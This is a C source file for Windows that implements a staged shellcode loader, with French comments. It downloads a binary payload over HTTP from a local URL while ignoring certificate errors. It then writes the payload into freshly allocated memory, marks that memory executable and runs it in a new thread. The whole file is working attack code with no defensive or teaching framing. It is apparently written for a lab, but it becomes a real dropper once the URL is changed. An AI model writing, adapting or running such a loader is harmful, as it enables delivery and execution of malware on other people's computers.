#include <windows.h>
#include <wininet.h>
#include <stdio.h>

BOOL RunShellcode(IN PVOID shellcode, IN SIZE_T sShellcodeSize) {

    PVOID pShellcodeAddress = NULL;
    DWORD dwOldProtection = 0;

    pShellcodeAddress = VirtualAlloc(NULL, sShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

    memcpy(pShellcodeAddress, shellcode, sShellcodeSize);
    memset(shellcode, '\0', sShellcodeSize);

    if (!VirtualProtect(pShellcodeAddress, sShellcodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    HANDLE hThread = CreateThread(NULL, 0, pShellcodeAddress, NULL, 0, NULL);

    if (!hThread) {
        printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    return TRUE;
}


PBYTE getShellcode(const char* url, DWORD* outSize) {
    *outSize = 0;

    HINTERNET hInternet = InternetOpenA(
        "Mozilla",
        INTERNET_OPEN_TYPE_PRECONFIG,
        NULL,
        NULL,
        0
    );
    if (!hInternet) {
        printf("[-] InternetOpenA failed : %lu\n", GetLastError());
        return NULL;
    }

    HINTERNET hInternetFile = InternetOpenUrlA(
        hInternet,
        url,
        NULL,
        0,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID,
        0
    );
    if (!hInternetFile) {
        printf("[-] InternetOpenUrlA failed : %lu\n", GetLastError());
        InternetCloseHandle(hInternet);
        return NULL;
    }

    BYTE  tmpBuf[4096];
    DWORD bytesRead  = 0;
    DWORD totalSize  = 0;

    HANDLE hHeap = GetProcessHeap();
    PBYTE  pBytes = NULL;

    while (InternetReadFile(hInternetFile, tmpBuf, sizeof(tmpBuf), &bytesRead) && bytesRead > 0) {

        if (pBytes == NULL) {
            // premier bloc
            pBytes = (PBYTE)HeapAlloc(hHeap, 0, bytesRead);
            if (!pBytes) {
                printf("[-] HeapAlloc failed\n");
                InternetCloseHandle(hInternetFile);
                InternetCloseHandle(hInternet);
                return NULL;
            }
            memcpy(pBytes, tmpBuf, bytesRead);
            totalSize = bytesRead;
        }
        else {
            // on agrandit
            PBYTE newBuf = (PBYTE)HeapReAlloc(hHeap, 0, pBytes, totalSize + bytesRead);
            if (!newBuf) {
                printf("[-] HeapReAlloc failed : %lu\n", GetLastError());
                HeapFree(hHeap, 0, pBytes);
                InternetCloseHandle(hInternetFile);
                InternetCloseHandle(hInternet);
                return NULL;
            }
            pBytes = newBuf;

            memcpy(pBytes + totalSize, tmpBuf, bytesRead);
            totalSize += bytesRead;
        }
    }

    InternetCloseHandle(hInternetFile);
    InternetCloseHandle(hInternet);

    *outSize = totalSize;
    return pBytes;
}

int main(void) {

    DWORD scSize = 0;
    PBYTE shellcode = getShellcode("http://127.0.0.1:8000/payload.bin", &scSize);

    if (!shellcode) {
        printf("[-] Download failed\n");
        return 1;
    }

    printf("[+] %lu bytes lus\n", scSize);

    for (DWORD i = 1; i < scSize+1; i++) {
        printf("%02X ", shellcode[i-1]);
        if (i%16 == 0) printf("\n");
    }
    printf("\n");

    if (!RunShellcode(shellcode, scSize)) {
        return -1;
    }
    HeapFree(GetProcessHeap(), 0, shellcode);

    return 0;
}
